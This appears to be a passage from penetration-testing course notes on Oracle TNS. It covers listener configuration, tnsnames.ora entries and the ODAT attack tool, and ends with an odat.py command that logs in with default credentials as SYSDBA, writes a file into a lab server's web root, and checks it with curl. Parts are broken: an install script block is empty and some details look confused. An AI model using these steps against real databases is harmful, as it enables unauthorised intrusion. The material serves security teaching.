By default, the listener listens for incoming connections on the `TCP/1521` port.
The TNS listener is configured to support various network protocols, including `TCP/IP`, `UDP`, `IPX/SPX`, and `AppleTalk`. By default, Oracle TNS can be remotely managed in `Oracle 8i`/`9i` but not in Oracle 10g/11g.

The configuration files for Oracle TNS are called `tnsnames.ora` and `listener.ora` and are typically located in the `$ORACLE_HOME/network/admin` directory.

Oracle TNS is often used with other Oracle services like Oracle DBSNMP, Oracle Databases, Oracle Application Server, Oracle Enterprise Manager, Oracle Fusion Middleware, web servers, and many more.

Each database or service has a unique entry in the [tnsnames.ora](https://docs.oracle.com/cd/E11882_01/network.112/e10835/tnsnames.htm#NETRF007) file, containing the necessary information for clients to connect to the service. The entry consists of a name for the service, the network location of the service, and the database or service name that clients should use when connecting to the service. For example, a simple `tnsnames.ora` file might look like this:

```txt
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

Oracle databases can be protected by using so-called PL/SQL Exclusion List (`PlsqlExclusionList`). It is a user-created text file that needs to be placed in the `$ORACLE_HOME/sqldeveloper` directory, and it contains the names of PL/SQL packages or types that should be excluded from execution. Once the PL/SQL Exclusion List file is created, it can be loaded into the database instance. It serves as a blacklist that cannot be accessed through the Oracle Application Server.

|**Setting**|**Description**|
|---|---|
|`DESCRIPTION`|A descriptor that provides a name for the database and its connection type.|
|`ADDRESS`|The network address of the database, which includes the hostname and port number.|
|`PROTOCOL`|The network protocol used for communication with the server|
|`PORT`|The port number used for communication with the server|
|`CONNECT_DATA`|Specifies the attributes of the connection, such as the service name or SID, protocol, and database instance identifier.|
|`INSTANCE_NAME`|The name of the database instance the client wants to connect.|
|`SERVICE_NAME`|The name of the service that the client wants to connect to.|
|`SERVER`|The type of server used for the database connection, such as dedicated or shared.|
|`USER`|The username used to authenticate with the database server.|
|`PASSWORD`|The password used to authenticate with the database server.|
|`SECURITY`|The type of security for the connection.|
|`VALIDATE_CERT`|Whether to validate the certificate using SSL/TLS.|
|`SSL_VERSION`|The version of SSL/TLS to use for the connection.|
|`CONNECT_TIMEOUT`|The time limit in seconds for the client to establish a connection to the database.|
|`RECEIVE_TIMEOUT`|The time limit in seconds for the client to receive a response from the database.|
|`SEND_TIMEOUT`|The time limit in seconds for the client to send a request to the database.|
|`SQLNET.EXPIRE_TIME`|The time limit in seconds for the client to detect a connection has failed.|
|`TRACE_LEVEL`|The level of tracing for the database connection.|
|`TRACE_DIRECTORY`|The directory where the trace files are stored.|
|`TRACE_FILE_NAME`|The name of the trace file.|
|`LOG_FILE`|The file where the log information is stored.|

Before we can enumerate the TNS listener and interact with it, we need to download a few packages and tools for our `Pwnbox` instance in case it does not have these already. Here is a Bash script that does all of that:

```shell

Oracle Database Attacking Tool (`ODAT`) is an open-source penetration testing tool written in Python and designed to enumerate and exploit vulnerabilities in Oracle databases. It can be used to identify and exploit various security flaws in Oracle databases, including SQL injection, remote code execution, and privilege escalation.

Ripcord88x@htb[/htb]$ ./odat.py -h

## Oracle RDBMS - File Upload

```shell
Ripcord88x@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
Ripcord88x@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
```

Finally, we can test if the file upload approach worked with `curl`. Therefore, we will use a `GET http://<IP>` request, or we can visit via browser.

```shell
Ripcord88x@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt

```
